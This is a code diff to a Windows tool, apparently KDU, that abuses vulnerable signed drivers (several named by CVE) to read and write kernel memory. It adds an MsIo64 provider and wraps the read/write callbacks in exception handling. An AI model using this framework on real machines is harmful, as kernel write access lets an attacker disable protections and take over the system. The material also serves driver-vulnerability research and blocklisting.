@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.00
 *
-*  DATE:        02 Feb 2020
+*  DATE:        07 Feb 2020
 *
 *  Vulnerable driver providers routines.
 *
@@ -22,6 +22,7 @@
 #include "idrv/rtcore.h"
 #include "idrv/gdrv.h"
 #include "idrv/atszio.h"
+#include "idrv/msio.h"
 
 //
 // Since we have a lot of them, make an abstraction layer.
@@ -32,7 +33,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_iQVM64,
-        0,
+        0x00000000,
         (LPWSTR)L"CVE-2015-2291",
         (LPWSTR)L"NalDrv",
         (LPWSTR)L"Nal",
@@ -50,7 +51,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_RTCORE64,
-        0,
+        0x00000000,
         (LPWSTR)L"CVE-2019-16098",
         (LPWSTR)L"RTCore64",
         (LPWSTR)L"RTCore64",
@@ -68,7 +69,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_GDRV,
-        0,
+        0x00000000,
         (LPWSTR)L"CVE-2018-19320",
         (LPWSTR)L"Gdrv",
         (LPWSTR)L"GIO",
@@ -86,7 +87,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_ATSZIO64,
-        0,
+        0x00000000,
         (LPWSTR)L"ASUSTeK WinFlash",
         (LPWSTR)L"ATSZIO",
         (LPWSTR)L"ATSZIO",
@@ -97,6 +98,24 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
         (provQueryPML4)AtszioQueryPML4Value,
         (provReadPhysicalMemory)AtszioReadPhysicalMemory,
         (provWritePhysicalMemory)AtszioWritePhysicalMemory,
+        (provRegisterDriver)KDUProviderStub,
+        (provUnregisterDriver)KDUProviderStub
+    },
+
+    {
+        KDU_MAX_NTBUILDNUMBER,
+        IDR_MSIO64,
+        0x00000002,
+        (LPWSTR)L"CVE-2019-18845",
+        (LPWSTR)L"MsIo64",
+        (LPWSTR)L"MsIo",
+        (provReadKernelVM)MsioReadKernelVirtualMemory,
+        (provWriteKernelVM)MsioWriteKernelVirtualMemory,
+        (provVirtualToPhysical)MsioVirtualToPhysical,
+        (provReadControlRegister)KDUProviderStub,
+        (provQueryPML4)MsioQueryPML4Value,
+        (provReadPhysicalMemory)MsioReadPhysicalMemory,
+        (provWritePhysicalMemory)MsioWritePhysicalMemory,
         (provRegisterDriver)KDUProviderStub,
         (provUnregisterDriver)KDUProviderStub
     }
@@ -120,15 +139,31 @@ VOID KDUProvList()
     for (ULONG i = 0; i < KDU_PROVIDERS_MAX; i++) {
         prov = &g_KDUProviders[i];
 
-        printf_s("Provider: Id %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
+        printf_s("Provider # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
             i,
             prov->Desciption,
             prov->DriverName,
             prov->DeviceName);
 
-        printf_s("\tHVCI support %lu, MaxNtBuildNumberSupport 0x%lX\r\n",
-            prov->HvciSupport,
-            prov->MaxNtBuildNumberSupport);
+        //
+        // List provider flags.
+        //
+        printf_s("\tHVCI support: %s\r\n"\
+            "\tWHQL signature: %s\r\n",
+            (prov->SupportHVCI == 0) ? "No" : "Yes",
+            (prov->SignatureWHQL == 0) ? "No" : "Yes");
+
+        //
+        // Maximum support Windows build.
+        //
+        if (prov->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
+            printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
+        }
+        else {
+            printf_s("\tMaximum supported Windows build: 0x%lX\r\n",
+                prov->MaxNtBuildNumberSupport);
+        }
+
     }
 
     printf_s("[<] Leaving %s\r\n", __FUNCTION__);
@@ -295,6 +330,7 @@ BOOL WINAPI KDUReadKernelVM(
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
+    BOOL bResult = FALSE;
     KDU_PROVIDER* prov = Context->Provider;
 
     if (Address < Context->MaximumUserModeAddress) {
@@ -302,10 +338,22 @@ BOOL WINAPI KDUReadKernelVM(
         return FALSE;
     }
 
-    return prov->Callbacks.ReadKernelVM(Context->DeviceHandle,
-        Address,
-        Buffer,
-        NumberOfBytes);
+    //
+    // Some providers under several conditions may crash here without bugcheck.
+    //
+    __try {
+
+        bResult = prov->Callbacks.ReadKernelVM(Context->DeviceHandle,
+            Address,
+            Buffer,
+            NumberOfBytes);
+
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        SetLastError(GetExceptionCode());
+        return FALSE;
+    }
+    return bResult;
 }
 
 /*
@@ -323,6 +371,7 @@ BOOL WINAPI KDUWriteKernelVM(
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
+    BOOL bResult = FALSE;
     KDU_PROVIDER* prov = Context->Provider;
 
     if (Address < Context->MaximumUserModeAddress) {
@@ -330,10 +379,22 @@ BOOL WINAPI KDUWriteKernelVM(
         return FALSE;
     }
 
-    return prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
-        Address,
-        Buffer,
-        NumberOfBytes);
+    //
+    // Some providers under several conditions may crash here without bugcheck.
+    //
+    __try {
+
+        bResult = prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
+            Address,
+            Buffer,
+            NumberOfBytes);
+
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        SetLastError(GetExceptionCode());
+        return FALSE;
+    }
+    return bResult;
 }
 
 /*
@@ -383,7 +444,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
     //
     // Check HVCI support.
     //
-    if (HvciEnabled && prov->HvciSupport == 0) {
+    if (HvciEnabled && prov->SupportHVCI == 0) {
         printf_s("[!] Abort: selected provider does not support HVCI\r\n");
         return NULL;
     }
@@ -413,17 +474,17 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
             (PVOID)prov->Callbacks.WriteKernelVM == (PVOID)KDUProviderStub)
         {
             printf_s("[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
-                "KDU interface is not implemented for these methods\r\n");
+                "\tKDU interface is not implemented for these methods\r\n");
 
 #ifndef _DEBUG
             return NULL;
 #endif
-        }
+    }
         break;
 
     default:
         break;
-    }
+}
 
     NTSTATUS ntStatus;
 
